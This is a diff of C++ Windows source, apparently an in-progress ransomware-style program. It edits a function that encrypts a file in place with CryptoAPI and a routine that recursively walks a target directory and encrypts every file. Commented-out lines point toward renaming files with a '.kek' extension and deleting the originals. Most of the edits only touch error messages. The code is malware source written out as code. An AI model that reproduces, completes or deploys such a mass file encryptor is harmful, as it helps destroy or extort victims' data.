@@ -35,7 +35,6 @@ int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {
 
 	}
 
-	//wcscat_s(pzDestFile, MAX_PATH, L".kek");
 
 	hDestFile = CreateFileW(pzDestFile, FILE_WRITE_DATA | DELETE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	if (INVALID_HANDLE_VALUE != hDestFile) {
@@ -52,14 +51,13 @@ int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {
 	while (eof == 0) {
 
 		if (ReadFile(hSourceFile, pbBuffer, dwBlockLen, &dwCount, NULL) == 0) {
-
 			DWORD d = GetLastError();
 			std::cout << "Error reading from the sourcefile, error code 0x8:" << d << std::endl;
 			break;
 
 		}
 
-		//std::cout << dwCount << std::endl;
+		
 		if (dwCount < dwBlockLen) {
 
 			eof = 1;
@@ -68,7 +66,7 @@ int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {
 		if (CryptEncrypt(clé, 0, eof, 0, (BYTE*)pbBuffer, &dwCount, dwBufferLen) == 0) {
 
 			DWORD d = GetLastError();
-			std::cout << "Error encrypting the buffer, error code 0x8" << d << std::endl;
+			std::cout << "Error encrypting the buffer, error code 0x" << d << std::endl;
 			break;
 
 		}
@@ -76,15 +74,18 @@ int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {
 		if (WriteFile(hDestFile, pbBuffer, dwCount, &dwCount, NULL) == 0) {
 
 			DWORD d = GetLastError();
-			std::cout << "Error writing to the destfile, error code 0x8:" << d << std::endl;
+			std::cout << "Error writing to the destfile, error code 0x:" << d << std::endl;
 			break;
 
 
 		}
 
-		/*if (DeleteFile(pzDestFile) == 0) {
+		//CloseHandle(hSourceFile);
+		//CloseHandle(hDestFile);
+
+		/*if (DeleteFile(szOGFileName) == 0) {
 			DWORD d = GetLastError();
-			std::cout << "Error writing to the destfile, error code 0x8:" << d << std::endl;
+			std::cout << "Error deleting the OG file, error code 0x:" << d << std::endl;
 			break;
 
 		}*/
@@ -108,7 +109,7 @@ bool traverse(LPCWSTR targetDir, HCRYPTKEY clé, int nLevel = 0) {
 
 	hFind = FindFirstFile(szDir, &file_data);
 	if (hFind == INVALID_HANDLE_VALUE) {
-		std::cout << "FindFirstFile failed, with errorcode : " << GetLastError() << std::endl;
+		std::cout << "FindFirstFile failed, with errorcode 0x: " << GetLastError() << std::endl;
 		return false;
 	}
 
@@ -136,8 +137,6 @@ bool traverse(LPCWSTR targetDir, HCRYPTKEY clé, int nLevel = 0) {
 			StringCchCatW(szFullPath, MAX_PATH, L"\\");
 			StringCchCatW(szFullPath, MAX_PATH, file_data.cFileName);
 			enkrypt(szFullPath, clé);
-			//enkrypt(file_data.cFileName,clé);
-			//printf("%ws%ws\n", szOutLine, file.data.cFileName);
 		}
 	} while (FindNextFile(hFind, &file_data) != 0);
 
